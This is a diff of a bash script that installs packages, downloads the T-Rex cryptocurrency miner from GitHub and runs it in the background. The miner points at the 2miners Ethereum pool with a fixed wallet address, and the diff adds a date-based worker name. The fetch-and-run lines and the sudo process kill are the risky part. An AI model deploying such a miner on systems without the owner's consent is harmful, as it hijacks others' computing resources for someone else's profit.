@@ -1,3 +1,6 @@
+woker=$(date +'%d%m_')
+name=vroman241
+woker+=$name
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	echo "Start setup..."
@@ -17,15 +20,15 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
 	sudo apt-get install libcurl3 -y
 	echo "taind vip pro" > isHaveSetupCoin.txt
 	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-  sudo killall XXX
-  ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $woker &
+  	sudo killall XXX
+  	./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $woker &
 else
 	if pgrep ethminer >/dev/null 2>&1
 	then
 		echo "RUNNING"
 	else
 		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-    sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $woker &
+    		sudo killall XXX
+    		./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $woker &
 	fi
 fi
